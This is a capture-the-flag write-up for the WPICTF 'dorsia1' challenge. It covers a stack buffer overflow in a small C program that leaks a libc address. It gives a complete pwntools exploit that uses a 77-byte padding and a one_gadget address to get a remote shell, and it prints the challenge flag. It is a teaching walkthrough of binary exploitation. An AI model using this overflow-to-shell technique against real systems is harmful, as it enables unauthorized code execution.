nc dorsia1.wpictf.xyz 31337 or 31338 or 31339

made by: awg

Hint: Same libc as dorsia4, but you shouldn't need the file to solve.
Hint2: 'A' * 77

## Source Code

```C
#include <stdio.h>
#include <stdlib.h>

void main() {
    char a[69];
    printf("%p\n",system+765772);
    fgets(a,96,stdin); 
}
```

## Writeup
This looks like a very typical buffer overflow challenge... However, our exploits just didn't work. Why?

The great minds at WPICTF decided to disable stack alignment for this challenge. We were using 88 bytes of garbage, but actually it's 77, as the second hint suggests. 69 + 8 for rbp. 

Let's use `one_gadget` on the libc (from dorsia4) and it's done.


```
from pwn import *

p = remote('dorsia1.wpictf.xyz', 31339)
e = ELF('./libc.so.6')

# Leak addresses
leak = int(p.recvline(), 16)
system = leak - 765772
libc = system - e.sym['__libc_system']
one_gadget = libc + 0x4f322
padding = b'A' * 77

# Info
print('Libc: ', hex(libc))
print('System: ', hex(system))

# Send the one_gadget and get flag ez
p.sendline(padding + p64(one_gadget))
p.interactive()
```


## Flag
`WPI{FEED_ME_A_STRAY_CAT}`
